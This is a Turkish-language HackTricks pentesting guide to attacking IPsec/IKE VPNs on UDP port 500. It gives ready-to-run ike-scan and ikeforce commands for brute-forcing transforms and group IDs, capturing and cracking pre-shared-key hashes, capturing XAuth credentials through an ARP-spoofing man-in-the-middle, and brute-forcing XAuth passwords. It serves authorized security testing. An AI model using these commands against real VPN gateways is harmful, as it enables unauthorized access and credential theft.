# 500/udp - IPsec/IKE VPN Pentesting

{{#include ../banners/hacktricks-training.md}}

## Temel Bilgiler

**IPsec**, ağlar arasında (LAN-to-LAN) ve uzaktan kullanıcıların ağ geçidine (uzaktan erişim) iletişimini güvence altına almak için ana teknoloji olarak geniş çapta tanınmaktadır ve kurumsal VPN çözümlerinin belkemiğini oluşturur.

İki nokta arasında bir **güvenlik ilişkisi (SA)** kurulumu, kimlik doğrulama ve anahtar değişimi için tasarlanmış bir protokol olan ISAKMP çerçevesinde çalışan **IKE** tarafından yönetilmektedir. Bu süreç birkaç aşamada gerçekleşir:

- **Aşama 1:** İki uç nokta arasında güvenli bir kanal oluşturulur. Bu, bir Önceden Paylaşılan Anahtar (PSK) veya sertifikalar kullanılarak, üç mesaj çiftini içeren ana mod veya **agresif mod** kullanılarak gerçekleştirilir.
- **Aşama 1.5:** Zorunlu olmamakla birlikte, Genişletilmiş Kimlik Doğrulama Aşaması olarak bilinen bu aşama, bağlanmaya çalışan kullanıcının kimliğini doğrulamak için bir kullanıcı adı ve şifre gerektirir.
- **Aşama 2:** Bu aşama, verileri güvence altına almak için **ESP** ve **AH** ile parametrelerin müzakere edilmesine adanmıştır. **Mükemmel İleri Gizlilik (PFS)** sağlamak için Aşama 1'deki algoritmalardan farklı algoritmaların kullanılmasına izin verir, güvenliği artırır.

**Varsayılan port:** 500/udp

## **nmap** kullanarak hizmeti keşfedin
```
root@bt:~# nmap -sU -p 500 172.16.21.200
Starting Nmap 5.51 (http://nmap.org) at 2011-11-26 10:56 IST
Nmap scan report for 172.16.21.200
Host is up (0.00036s latency).
PORT    STATE SERVICE
500/udp open  isakmp
MAC Address: 00:1B:D5:54:4D:E4 (Cisco Systems)
```
## **Geçerli bir dönüşüm bulma**

IPSec yapılandırması yalnızca bir veya birkaç dönüşümü kabul edecek şekilde hazırlanabilir. Bir dönüşüm, değerlerin bir kombinasyonudur. **Her dönüşüm**, DES veya 3DES gibi **şifreleme algoritması**, SHA veya MD5 gibi **bütünlük algoritması**, önceden paylaşılan bir anahtar gibi **kimlik doğrulama türü**, Diffie-Hellman 1 veya 2 gibi anahtar **dağıtım algoritması** ve 28800 saniye gibi **ömür** gibi bir dizi özellik içerir.

O halde, yapmanız gereken ilk şey **geçerli bir dönüşüm bulmak**tır, böylece sunucu sizinle iletişim kuracaktır. Bunu yapmak için **ike-scan** aracını kullanabilirsiniz. Varsayılan olarak, Ike-scan ana modda çalışır ve bir ISAKMP başlığı ile birlikte bir paketi geçide gönderir ve **içinde sekiz dönüşüm bulunan** tek bir öneri gönderir.

Cevaba bağlı olarak, uç nokta hakkında bazı bilgiler elde edebilirsiniz:
```
root@bt:~# ike-scan -M 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=d90bf054d6b76401)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

Ending ike-scan 1.9: 1 hosts scanned in 0.015 seconds (65.58 hosts/sec). 1 returned handshake; 0 returned notify
```
Önceki yanıtta görebileceğiniz gibi, **AUTH** adında bir alan var ve değeri **PSK**. Bu, vpn'nin bir önceden paylaşılan anahtar kullanılarak yapılandırıldığı anlamına gelir (ve bu, bir pentester için gerçekten iyi).\
**Son satırın değeri de çok önemlidir:**

- _0 dönen el sıkışma; 0 dönen bildirim:_ Bu, hedefin **bir IPsec geçidi olmadığını** gösterir.
- _**1 dönen el sıkışma; 0 dönen bildirim:**_ Bu, **hedefin IPsec için yapılandırıldığını ve IKE müzakeresi yapmaya istekli olduğunu, önerdiğiniz dönüşümlerden birinin veya daha fazlasının kabul edilebilir olduğunu** gösterir (geçerli bir dönüşüm çıktıda gösterilecektir).
- _0 dönen el sıkışma; 1 dönen bildirim:_ VPN geçitleri, **dönüşümlerin hiçbiri kabul edilebilir olmadığında** bir bildirim mesajı ile yanıt verir (bazı geçitler bunu yapmaz, bu durumda daha fazla analiz ve revize edilmiş bir öneri denenmelidir).

Bu durumda zaten geçerli bir dönüşümümüz var, ancak 3. durumda iseniz, geçerli bir dönüşüm bulmak için **biraz brute-force yapmanız gerekir:**

Öncelikle, tüm olası dönüşümleri oluşturmanız gerekir:
```bash
for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "--trans=$ENC,$HASH,$AUTH,$GROUP" >> ike-dict.txt ;done ;done ;done ;done
```
Ve ardından her birini ike-scan kullanarak brute-force yapın (bu birkaç dakika sürebilir):
```bash
while read line; do (echo "Valid trans found: $line" && sudo ike-scan -M $line <IP>) | grep -B14 "1 returned handshake" | grep "Valid trans found" ; done < ike-dict.txt
```
Eğer brute-force işe yaramadıysa, belki de sunucu, geçerli dönüşümlere bile el sıkışmaları olmadan yanıt veriyordur. O zaman, aynı brute-force'u ama agresif mod kullanarak deneyebilirsiniz:
```bash
while read line; do (echo "Valid trans found: $line" && ike-scan -M --aggressive -P handshake.txt $line <IP>) | grep -B7 "SA=" | grep "Valid trans found" ; done < ike-dict.txt
```
Umarım **geçerli bir dönüşüm geri yansıtılır**.\
Aynı **saldırıyı** [**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py) kullanarak deneyebilirsiniz.\
Ayrıca dönüşümleri kaba kuvvetle denemek için [**ikeforce**](https://github.com/SpiderLabs/ikeforce) kullanabilirsiniz:
```bash
./ikeforce.py <IP> # No parameters are required for scan -h for additional help
```
![](<../images/image (617).png>)

**DH Grubu: 14 = 2048-bit MODP** ve **15 = 3072-bit**\
**2 = HMAC-SHA = SHA1 (bu durumda). `--trans` formatı $Enc,$Hash,$Auth,$DH**

Cisco, DH grupları 1 ve 2'nin yeterince güçlü olmadığını belirterek kullanılmamasını öneriyor. Uzmanlar, **kaynakları bol olan ülkelerin bu zayıf grupları kullanan verilerin şifrelemesini kolayca kırabileceğine** inanıyor. Bu, kodları hızlı bir şekilde kırmaya hazırlayan özel bir yöntem kullanılarak yapılır. Bu yöntemi kurmanın maliyeti yüksek olsa da, bu güçlü ülkelerin, zayıf bir grup (örneğin 1,024-bit veya daha küçük) kullanıyorsa şifrelenmiş verileri gerçek zamanlı olarak okumalarına olanak tanır.

### Sunucu parmak izi alma

Daha sonra, cihazın **satıcısını keşfetmek** için ike-scan kullanabilirsiniz. Araç, bir başlangıç önerisi gönderir ve tekrar oynamayı durdurur. Ardından, sunucudan alınan **mesajlar** ile eşleşen yanıt deseninin **zaman** farkını **analiz** ederek, pentester VPN geçidi satıcısını başarıyla parmak izi alabilir. Dahası, bazı VPN sunucuları IKE ile isteğe bağlı **Satıcı Kimliği (VID) yükünü** kullanacaktır.

**Gerekirse geçerli dönüşümü belirtin** (using --trans)

IKE, satıcının kim olduğunu keşfederse, bunu yazdıracaktır:
```
root@bt:~# ike-scan -M --showbackoff 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=4f3ec84731e2214a)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

IKE Backoff Patterns:

IP Address       No.  Recv time            Delta Time
172.16.21.200    1    1322286031.744904    0.000000
172.16.21.200    2    1322286039.745081    8.000177
172.16.21.200    3    1322286047.745989    8.000908
172.16.21.200    4    1322286055.746972    8.000983
172.16.21.200    Implementation guess: Cisco VPN Concentrator

Ending ike-scan 1.9: 1 hosts scanned in 84.080 seconds (0.01 hosts/sec). 1 returned handshake; 0 returned notify
```
Bu, nmap script _**ike-version**_ ile de gerçekleştirilebilir.

## Doğru ID'yi (grup adını) bulma

Hash'i yakalamak için geçerli bir dönüşüm ve doğru ID (grup adı) gereklidir. Geçerli grup adını bilmeyeceksiniz, bu yüzden bunu brute-force ile denemeniz gerekecek.\
Bunu yapmak için size 2 yöntem öneririm:

### ike-scan ile ID'yi brute-force yapmak

Öncelikle, hash'i toplamak için sahte bir ID ile bir istek yapmayı deneyin ("-P"):
```bash
ike-scan -P -M -A -n fakeID <IP>
```
Eğer **hiçbir hash döndürülmüyorsa**, bu durumda bu brute forcing yöntemi muhtemelen işe yarayacaktır. **Eğer bazı hash'ler döndürülüyorsa, bu sahte bir ID için sahte bir hash'in geri gönderileceği anlamına gelir, bu nedenle bu yöntem ID'yi brute-force etmek için güvenilir olmayacaktır.** Örneğin, sahte bir hash döndürülebilir (bu modern versiyonlarda olur):

![](<../images/image (917).png>)

Ama dediğim gibi, eğer hiçbir hash döndürülmüyorsa, o zaman ike-scan kullanarak yaygın grup isimlerini brute-force etmeyi denemelisiniz.

Bu script **mümkün olan ID'leri brute-force etmeyi deneyecek** ve geçerli bir el sıkışma döndürülen ID'leri geri verecektir (bu geçerli bir grup adı olacaktır).

Eğer belirli bir dönüşüm keşfettiyseniz, bunu ike-scan komutuna ekleyin. Ve eğer birkaç dönüşüm keşfettiyseniz, hepsini denemek için yeni bir döngü eklemekten çekinmeyin (birinin düzgün çalışana kadar hepsini denemelisiniz).

Yaygın grup isimlerini brute-force etmek için [ikeforce sözlüğünü](https://github.com/SpiderLabs/ikeforce/blob/master/wordlists/groupnames.dic) veya [seclists'teki](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/ike-groupid.txt) birini kullanabilirsiniz:
```bash
while read line; do (echo "Found ID: $line" && sudo ike-scan -M -A -n $line <IP>) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < /usr/share/wordlists/external/SecLists/Miscellaneous/ike-groupid.txt
```
{{#file}}
vpnIDs.txt
{{#endfile}}

### Iker ile ID Kırma

[**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py) ayrıca olası grup adlarını kırmak için **ike-scan** kullanır. **ike-scan çıktısına dayanarak geçerli bir ID bulmak için** kendi yöntemini izler.

### ikeforce ile ID Kırma

[**ikeforce.py**](https://github.com/SpiderLabs/ikeforce) **ID'leri kırmak için** kullanılabilecek bir araçtır. Bu araç, **geçerli ve geçersiz bir ID'yi ayırt etmek için kullanılabilecek farklı zafiyetleri istismar etmeye çalışacaktır** (yanlış pozitifler ve yanlış negatifler olabilir, bu yüzden mümkünse ike-scan yöntemini kullanmayı tercih ediyorum).

Varsayılan olarak **ikeforce**, başlangıçta sunucunun davranışını kontrol etmek ve kullanılacak taktiği belirlemek için bazı rastgele ID'ler gönderir.

- **Birinci yöntem**, grup adlarını **araştırarak** **Dead Peer Detection DPD** bilgilerini kırmaktır (bu bilgi, grup adı doğruysa yalnızca sunucu tarafından yanıtlanır).
- **İkinci yöntem**, her denemeye gönderilen yanıt sayısını **kontrol etmektir** çünkü bazen doğru ID kullanıldığında daha fazla paket gönderilir.
- **Üçüncü yöntem**, yanlış ID'ye yanıt olarak **"INVALID-ID-INFORMATION"** aramaktır.
- Son olarak, sunucu kontrollerine hiçbir yanıt vermezse, **ikeforce** sunucuyu kırmaya çalışacak ve doğru ID gönderildiğinde sunucunun bazı paketlerle yanıt verip vermediğini kontrol edecektir.\
Elbette, ID'yi kırmanın amacı geçerli bir ID'ye sahip olduğunuzda **PSK**'yı elde etmektir. Ardından, **ID** ve **PSK** ile XAUTH'ı kırmanız gerekecek (eğer etkinse).

Belirli bir dönüşüm keşfettiyseniz, bunu ikeforce komutuna ekleyin. Ve birden fazla dönüşüm keşfettiyseniz, hepsini denemek için yeni bir döngü eklemekten çekinmeyin (birinin düzgün çalışana kadar hepsini denemelisiniz).
```bash
git clone https://github.com/SpiderLabs/ikeforce.git
pip install 'pyopenssl==17.2.0' #It is old and need this version of the library
```

```bash
./ikeforce.py <IP> -e -w ./wordlists/groupnames.dic
```
### Sniffing ID

(From the book **Network Security Assessment: Know Your Network**): VPN istemcisi ile sunucu arasındaki bağlantıyı dinleyerek geçerli kullanıcı adları elde etmek de mümkündür, çünkü istemci kimliğini içeren ilk agresif mod paketi açık bir şekilde gönderilmektedir.

![](<../images/image (891).png>)

## Capturing & cracking the hash

Son olarak, eğer **geçerli bir dönüşüm** ve **grup adı** bulduysanız ve **agresif mod izin veriliyorsa**, o zaman kırılabilir hash'i çok kolay bir şekilde elde edebilirsiniz:
```bash
ike-scan -M -A -n <ID> --pskcrack=hash.txt <IP> #If aggressive mode is supported and you know the id, you can get the hash of the passwor
```
Hash, _hash.txt_ dosyasına kaydedilecektir.

**psk-crack**, **john** ([**ikescan2john.py**](https://github.com/truongkma/ctf-tools/blob/master/John/run/ikescan2john.py) kullanarak) ve **hashcat** kullanarak hash'i **çözebilirsiniz**:
```bash
psk-crack -d <Wordlist_path> psk.txt
```
## **XAuth**

**Aggressive mode IKE** ile birlikte kullanılan **Önceden Paylaşılan Anahtar (PSK)** genellikle **grup kimlik doğrulama** amaçları için tercih edilir. Bu yöntem, ek bir **kullanıcı kimlik doğrulama** katmanı ekleyen **XAuth (Genişletilmiş Kimlik Doğrulama)** ile güçlendirilmiştir. Bu tür kimlik doğrulama genellikle **Microsoft Active Directory**, **RADIUS** veya benzeri sistemler gibi hizmetleri kullanır.

**IKEv2**'ye geçildiğinde, kullanıcıları kimlik doğrulamak için **XAuth** yerine **EAP (Genişletilebilir Kimlik Doğrulama Protokolü)** kullanıldığına dair önemli bir değişim gözlemlenir. Bu değişim, güvenli iletişim protokollerindeki kimlik doğrulama uygulamalarında bir evrimi vurgular.

### Yerel ağ MitM ile kimlik bilgilerini yakalama

Bu nedenle, _fiked_ kullanarak giriş verilerini yakalayabilir ve varsayılan bir kullanıcı adı olup olmadığını görebilirsiniz (IKE trafiğini yakalamak için `fiked`'e yönlendirmeniz gerekir, bu ARP sahtekarlığı yardımıyla yapılabilir, [daha fazla bilgi](https://opensourceforu.com/2012/01/ipsec-vpn-penetration-testing-backtrack-tools/)). Fiked, bir VPN uç noktası olarak hareket edecek ve XAuth kimlik bilgilerini yakalayacaktır:
```bash
fiked -g <IP> -k testgroup:secretkey -l output.txt -d
```
Ayrıca, IPSec kullanarak bir MitM saldırısı yapmayı ve tüm trafiği 500 numaralı porta engellemeyi deneyin, eğer IPSec tüneli kurulamazsa belki trafik açık olarak gönderilecektir.

### XAUTH kullanıcı adı ve şifresini ikeforce ile brute force ile kırma

**XAUTH**'ı brute force ile kırmak için (geçerli bir grup adı **id** ve **psk** bildiğinizde) bir kullanıcı adı veya kullanıcı adları listesi ve bir şifreler listesi kullanabilirsiniz:
```bash
./ikeforce.py <IP> -b -i <group_id> -u <username> -k <PSK> -w <passwords.txt> [-s 1]
```
Bu şekilde, ikeforce her kullanıcı adı:şifre kombinasyonunu kullanarak bağlanmaya çalışacaktır.

Eğer bir veya birkaç geçerli dönüşüm bulduysanız, bunları önceki adımlardaki gibi kullanın.

## IPSEC VPN ile Kimlik Doğrulama

Kali'de, **VPNC** IPsec tünelleri kurmak için kullanılır. **profiller** `/etc/vpnc/` dizininde bulunmalıdır. Bu profilleri _**vpnc**_ komutunu kullanarak başlatabilirsiniz.

Aşağıdaki komutlar ve yapılandırmalar, VPNC ile bir VPN bağlantısı kurma sürecini göstermektedir:
```bash
root@system:~# cat > /etc/vpnc/samplevpn.conf << STOP
IPSec gateway [VPN_GATEWAY_IP]
IPSec ID [VPN_CONNECTION_ID]
IPSec secret [VPN_GROUP_SECRET]
IKE Authmode psk
Xauth username [VPN_USERNAME]
Xauth password [VPN_PASSWORD]
STOP
root@system:~# vpnc samplevpn
VPNC started in background (pid: [PID])...
root@system:~# ifconfig tun0
```
Bu kurulumda:

- `[VPN_GATEWAY_IP]` ile VPN geçidinin gerçek IP adresini değiştirin.
- `[VPN_CONNECTION_ID]` ile VPN bağlantısının tanımlayıcısını değiştirin.
- `[VPN_GROUP_SECRET]` ile VPN'nin grup gizli anahtarını değiştirin.
- `[VPN_USERNAME]` ve `[VPN_PASSWORD]` ile VPN kimlik doğrulama bilgilerini değiştirin.
- `[PID]`, `vpnc` başlatıldığında atanacak işlem kimliğini simgeler.

VPN'i yapılandırırken yer tutucuları değiştirmek için gerçek, güvenli değerlerin kullanıldığından emin olun.

## Referans Materyali

- [PSK cracking paper](http://www.ernw.de/download/pskattack.pdf)
- [SecurityFocus Infocus](http://www.securityfocus.com/infocus/1821)
- [Scanning a VPN Implementation](http://www.radarhack.com/dir/papers/Scanning_ike_with_ikescan.pdf)
- Network Security Assessment 3rd Edition

## Shodan

- `port:500 IKE`

{{#include ../banners/hacktricks-training.md}}
